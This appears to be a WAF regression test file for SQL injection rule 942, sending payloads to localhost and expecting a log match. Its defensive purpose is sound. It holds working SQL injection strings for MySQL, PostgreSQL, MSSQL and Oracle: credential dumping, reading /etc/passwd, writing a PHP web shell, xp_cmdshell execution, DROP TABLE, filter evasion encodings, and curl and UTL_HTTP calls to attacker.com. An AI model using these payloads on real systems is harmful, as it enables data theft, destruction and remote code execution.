meta:
  author: "Antigravity"
  description: "Comprehensive SQL Injection Attack Vectors (All Databases)"
  enabled: true
  name: "942-sqli-comprehensive"
tests:
  # Original tests preserved
  - test_id: 942100
    desc: "SQLi: JSON operator injection"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "POST"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
              Content-Type: "application/json"
            data: '{"user": "admin", "payload": {"@>": "SELECT * FROM users"}}'
          output:
            log_contains: "id \"942"
  - test_id: 942101
    desc: "SQLi: Negation operator != bypass"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?id=1' OR '1'!='2"
          output:
            log_contains: "id \"942"
  - test_id: 942102
    desc: "SQLi: Function synonyms (MID)"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?q=1 UNION SELECT mid(password,1,1) FROM users"
          output:
            log_contains: "id \"942"
  - test_id: 942103
    desc: "SQLi: Vertical tab whitespace"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?q=1%27UNION%0bSELECT%0b*%0bFROM%0busers--"
          output:
            log_contains: "id \"942"
  - test_id: 942104
    desc: "SQLi: Scientific notation"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "POST"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
              Content-Type: "application/x-www-form-urlencoded"
            data: "id=1e1 OR 1=1"
          output:
            log_contains: "id \"942"
  - test_id: 942105
    desc: "SQLi: Emoji comment obfuscation"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?id=1'/*üêº*/UNION/*üêº*/SELECT/*üêº*/1,2,3--"
          output:
            log_contains: "id \"942"
  # MySQL-specific attacks
  - test_id: 942106
    desc: "SQLi MySQL: Time-based blind (SLEEP)"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?id=1' AND SLEEP(5)--"
          output:
            log_contains: "id \"942"
  - test_id: 942107
    desc: "SQLi MySQL: BENCHMARK DoS"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?id=1' AND BENCHMARK(5000000,MD5('test'))--"
          output:
            log_contains: "id \"942"
  - test_id: 942108
    desc: "SQLi MySQL: LOAD_FILE"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?id=1' UNION SELECT LOAD_FILE('/etc/passwd')--"
          output:
            log_contains: "id \"942"
  - test_id: 942109
    desc: "SQLi MySQL: INTO OUTFILE"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "POST"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
              Content-Type: "application/x-www-form-urlencoded"
            data: "query=1' UNION SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/shell.php'--"
          output:
            log_contains: "id \"942"
  - test_id: 942110
    desc: "SQLi MySQL: GROUP_CONCAT data exfil"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?id=1' UNION SELECT GROUP_CONCAT(username,0x3a,password) FROM users--"
          output:
            log_contains: "id \"942"
  # PostgreSQL-specific
  - test_id: 942111
    desc: "SQLi PostgreSQL: pg_sleep"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?id=1'; SELECT pg_sleep(5)--"
          output:
            log_contains: "id \"942"
  - test_id: 942112
    desc: "SQLi PostgreSQL: COPY TO PROGRAM"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "POST"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
              Content-Type: "application/json"
            data: "{\"id\": \"1'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com'--\"}"
          output:
            log_contains: "id \"942"
  - test_id: 942113
    desc: "SQLi PostgreSQL: Large object import"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?id=1'; SELECT lo_import('/etc/passwd')--"
          output:
            log_contains: "id \"942"
  # MSSQL-specific
  - test_id: 942114
    desc: "SQLi MSSQL: WAITFOR DELAY"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?id=1'; WAITFOR DELAY '00:00:05'--"
          output:
            log_contains: "id \"942"
  - test_id: 942115
    desc: "SQLi MSSQL: xp_cmdshell"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "POST"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
              Content-Type: "application/x-www-form-urlencoded"
            data: "id=1'; EXEC xp_cmdshell 'whoami'--"
          output:
            log_contains: "id \"942"
  - test_id: 942116
    desc: "SQLi MSSQL: sp_OACreate RCE"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?id=1'; DECLARE @o INT; EXEC sp_OACreate 'WScript.Shell',@o OUT--"
          output:
            log_contains: "id \"942"
  # Oracle-specific
  - test_id: 942117
    desc: "SQLi Oracle: DBMS_PIPE.RECEIVE_MESSAGE"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?id=1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--"
          output:
            log_contains: "id \"942"
  - test_id: 942118
    desc: "SQLi Oracle: UTL_HTTP"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "POST"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
              Content-Type: "application/json"
            data: "{\"query\": \"1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com') FROM DUAL--\"}"
          output:
            log_contains: "id \"942"
  # Boolean blind techniques
  - test_id: 942119
    desc: "SQLi: Boolean blind - ASCII extraction"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?id=1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--"
          output:
            log_contains: "id \"942"
  - test_id: 942120
    desc: "SQLi: Boolean blind - LIKE operator"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?id=1' AND (SELECT username FROM users LIMIT 1) LIKE 'admin%'--"
          output:
            log_contains: "id \"942"
  # Error-based techniques
  - test_id: 942121
    desc: "SQLi: Error-based - ExtractValue (MySQL)"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?id=1' AND ExtractValue(1,CONCAT(0x7e,(SELECT @@version)))--"
          output:
            log_contains: "id \"942"
  - test_id: 942122
    desc: "SQLi: Error-based - UpdateXML"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?id=1' AND UpdateXML(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)),1)--"
          output:
            log_contains: "id \"942"
  - test_id: 942123
    desc: "SQLi: Error-based - CONVERT overflow (MSSQL)"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "POST"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
              Content-Type: "application/x-www-form-urlencoded"
            data: "id=1' AND 1=CONVERT(INT,(SELECT @@version))--"
          output:
            log_contains: "id \"942"
  # Union-based advanced
  - test_id: 942124
    desc: "SQLi: UNION NULL column discovery"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?id=1' UNION SELECT NULL,NULL,NULL,NULL--"
          output:
            log_contains: "id \"942"
  - test_id: 942125
    desc: "SQLi: UNION ORDER BY column enumeration"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?id=1' ORDER BY 10--"
          output:
            log_contains: "id \"942"
  # Stacked queries
  - test_id: 942126
    desc: "SQLi: Stacked queries - Multiple statements"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "POST"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
              Content-Type: "application/x-www-form-urlencoded"
            data: "id=1'; DROP TABLE users; SELECT * FROM admin--"
          output:
            log_contains: "id \"942"
  - test_id: 942127
    desc: "SQLi: Stacked queries - INSERT backdoor"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?id=1'; INSERT INTO users VALUES('hacker','pass')--"
          output:
            log_contains: "id \"942"
  # WAF evasion techniques
  - test_id: 942128
    desc: "SQLi: Inline comments /**/  "
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?id=1'/**/UNION/**/SELECT/**/password/**/FROM/**/users--"
          output:
            log_contains: "id \"942"
  - test_id: 942129
    desc: "SQLi: Mixed case evasion"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?id=1' UnIoN SeLeCt 1,2,3--"
          output:
            log_contains: "id \"942"
  - test_id: 942130
    desc: "SQLi: URL encoding bypass"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?id=1%27%20UNION%20SELECT%20password%20FROM%20users--"
          output:
            log_contains: "id \"942"
  - test_id: 942131
    desc: "SQLi: Double URL encoding"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?id=1%2527%2520UNION%2520SELECT%25201--"
          output:
            log_contains: "id \"942"
  - test_id: 942132
    desc: "SQLi: Hex encoding"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "POST"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
              Content-Type: "application/x-www-form-urlencoded"
            data: "id=0x61646D696E"
          output:
            log_contains: "id \"942"
  - test_id: 942133
    desc: "SQLi: String concatenation bypass"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?user=ad'+'min"
          output:
            log_contains: "id \"942"
  - test_id: 942134
    desc: "SQLi: CHAR() function bypass"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "GET"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
            uri: "/?id=1' AND user=CHAR(97,100,109,105,110)--"
          output:
            log_contains: "id \"942"
  - test_id: 942135
    desc: "SQLi: Second-order injection"
    stages:
      - stage:
          input:
            dest_addr: "127.0.0.1"
            method: "POST"
            port: 80
            headers:
              User-Agent: "WAF-Tester/1.0"
              Host: "localhost"
              Content-Type: "application/json"
            data: "{\"username\": \"admin'--\", \"action\": \"update_profile\"}"
          output:
            log_contains: "id \"942"
